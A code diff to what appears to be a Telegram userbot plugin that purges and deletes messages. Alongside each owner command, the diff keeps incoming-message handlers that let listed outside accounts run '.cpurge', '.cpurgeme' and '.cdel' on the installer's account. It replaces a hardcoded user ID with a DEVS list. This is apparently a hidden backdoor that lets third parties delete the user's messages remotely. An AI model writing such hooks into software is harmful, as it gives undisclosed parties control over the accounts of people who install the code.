@@ -8,12 +8,12 @@ from asyncio import sleep
 
 from telethon.errors import rpcbaseerrors
 
-from userbot import CMD_HELP
+from userbot import CMD_HELP, DEVS
 from userbot.events import register
 
 
 @register(outgoing=True, pattern=r"^\.purge$")
-@register(incoming=True, from_users=2014359828, pattern=r"^\.cpurge$")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurge$")
 async def fastpurger(purg):
     chat = await purg.get_input_chat()
     msgs = []
@@ -49,7 +49,7 @@ async def fastpurger(purg):
 
 
 @register(outgoing=True, pattern=r"^\.purgeme")
-@register(incoming=True, from_users=2014359828, pattern=r"^\.cpurgeme")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurgeme")
 async def purgeme(delme):
     message = delme.text
     count = int(message[9:])
@@ -77,7 +77,7 @@ async def purgeme(delme):
 
 
 @register(outgoing=True, pattern=r"^\.del$")
-@register(incoming=True, from_users=2014359828, pattern=r"^\.cdel$")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cdel$")
 async def delete_it(delme):
     msg_src = await delme.get_reply_message()
     if delme.reply_to_msg_id:
